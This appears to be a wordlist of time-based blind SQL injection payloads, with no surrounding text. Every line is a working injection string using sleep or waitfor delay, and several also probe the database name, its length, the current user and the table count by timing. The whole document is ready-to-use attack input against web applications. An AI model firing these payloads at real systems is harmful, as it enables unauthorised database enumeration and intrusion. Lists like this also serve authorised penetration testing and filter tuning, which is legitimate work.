' or sleep(5) --
') or sleep(5) or ('1'='1
" or sleep(5) or ("1"="1
')); SELECT sleep(5); --
")); SELECT sleep(5); --
' and sleep(5) and '1'='1
" and sleep(5) and "1"="1
' union select sleep(5),2,3 -- -
" union select sleep(5),2,3 -- -
'; waitfor delay '0:0:5' --
"; waitfor delay '0:0:5' --
' and extractvalue(1,concat(0x5c,(select sleep(5)),0x5c))--
" and extractvalue(1,concat(0x5c,(select sleep(5)),0x5c))--
' and if((select ascii(substring((select database()),1,1)))=97,sleep(5),1)--
" and if((select ascii(substring((select database()),1,1)))=97,sleep(5),1)--
'; if((select user())='root@localhost', sleep(5),1)--
"; if((select user())="root@localhost", sleep(5),1)--
' and if(length(database())=7, sleep(5),1)--
" and if(length(database())=7, sleep(5),1)--
'; if((select count(*) from information_schema.tables where table_schema=database())=20, sleep(5),1)--
"; if((select count(*) from information_schema.tables where table_schema=database())=20, sleep(5),1)--
